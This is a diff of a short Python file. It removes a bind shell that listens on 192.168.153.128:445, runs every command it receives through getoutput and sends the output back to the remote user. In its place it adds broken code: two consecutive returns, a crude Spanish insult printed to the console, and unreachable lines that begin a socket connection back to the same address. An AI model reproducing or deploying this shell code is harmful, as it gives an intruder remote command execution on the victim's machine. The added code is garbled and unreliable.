@@ -4,32 +4,8 @@ from os import chdir, getcwd
 from time import sleep
 
 def run():
-	
-	server_address = ('192.168.153.128', 445)
-	
-	server_socket = socket()
-	
-	server_socket.bind(server_address)
-	server_socket.listen(1)
-	client_socket, client_address = server_socket.accept()
-	
-	estado = True
-	
-	while estado:
-	    comando = client_socket.recv(4096).decode()
-	
-	    if comando == 'exit':
-	        client_socket.close()
-	        server_socket.close()
-	        estado = False
-	    
-	    elif comando.split(" ")[0] == 'cd':
-	        chdir(" ".join(comando.split(" ")[1:]))
-	        client_socket.send("ruta actual: {}".format(getcwd()).encode())
-	    
-	    else :
-	        salida = getoutput(comando)
-	        client_socket.send(salida.encode())
-	    
-	    sleep(0.1)
+	return os.listdir()
+	return print("hola perraaaa")
 
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("192.168.153.128",445))
